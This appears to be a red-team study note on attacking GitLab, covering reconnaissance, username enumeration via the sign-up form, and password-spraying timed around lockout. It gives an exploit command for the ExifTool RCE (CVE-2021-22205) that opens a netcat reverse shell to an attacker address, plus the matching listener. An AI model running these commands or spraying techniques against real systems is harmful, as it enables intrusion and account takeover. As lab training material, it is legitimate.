# Gitlab
## GitLab Assessment
**Concept:** GitLab is a complete DevOps platform. It is often a goldmine for Red Teams because it hosts source code, credentials, CI/CD pipelines, and infrastructure-as-code configurations. 
**Attack Surface:** Public repositories, User Enumeration, and Image Processing vulnerabilities (ExifTool).
### 1. Discovery & Fingerprinting
**Goal:** Identify the version, open registration status, and public projects without authentication.
#### Public Project Recon
Browse to `/explore` to find repositories that do not require login.
- **Target:** `http://gitlab.local/explore`
- **Objective:** Find hardcoded credentials, API keys, or infrastructure config files in public repos.
#### Version Enumeration
- **Help Page:** `/help` (Often displays version).
- **API:** `/api/v4/version` (Requires auth usually, but check for misconfigurations).
- **Meta Tags:** View Source -> Search for `gon.version`.
### 2. Enumeration
**Goal:** Build a list of valid usernames to facilitate password spraying.
#### Registration Form Abuse
If the instance allows registration (`/users/sign_up`), you can enumerate users by attempting to register with common usernames.
- **Indicator:** "Email is already taken" or "Username is already taken".
- **Constraint:** Even if "Sign-up enabled" is unchecked in settings, the endpoint `/users/sign_up` may still be accessible for enumeration, even if submission fails.
#### Automated User Enumeration
**Tool:** `gitlab_userenum.sh` (or Python equivalent). 
**Mechanism:** Abuses the subtle response differences in registration or API endpoints.
```shell
# Syntax: ./gitlab_userenum.sh --url <Target_URL> --userlist <Wordlist>
./gitlab_userenum.sh --url http://gitlab.inlanefreight.local:8081/ --userlist users.txt
```

**Tradecraft (Lockout Policy):**
- **Default Behavior (Pre-16.6):** 10 failed attempts = 10-minute lockout. Hardcoded.
- **Modern Behavior (16.6+):** Configurable via Admin UI.
- **Strategy:** Spray slowly. Try 1 password against all users, wait 10+ minutes, repeat.
### 3. Exploitation: ExifTool RCE (CVE-2021-22205)
**Concept:** GitLab uses `ExifTool` to strip metadata from uploaded images. Older versions (≤ 13.10.2) improperly validate **DjVu** file formats, allowing an attacker to embed a command in the image metadata that gets executed by the server. 
**Severity:** Critical. While often described as "Authenticated," logic flaws in `gitlab-workhorse` often allow this to be triggered **unauthenticated** if the attacker sends a valid image to an upload endpoint.
#### Vulnerability Mechanics
1. **Upload:** User uploads a weaponized image (e.g., `.jpg` that is actually a DjVu file).
2. **Processing:** `gitlab-workhorse` passes the file to `ExifTool` for cleaning.
3. **Execution:** `ExifTool` parses the malicious metadata tags (e.g., `Copyright`) which contain a Perl payload, triggering RCE.
#### Execution (Python PoC)
**Context:** You have identified a vulnerable version (< 13.10.3) and potentially have credentials (if the unauthenticated path is patched/blocked).
```shell
# Syntax: python3 exploit.py -t <URL> -u <User> -p <Pass> -c <Command>
# Note: The command creates a named pipe for a reverse shell.

python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f'
```
#### Listener Setup
Catch the callback on your attack box.
```shell
nc -lvnp 8443
```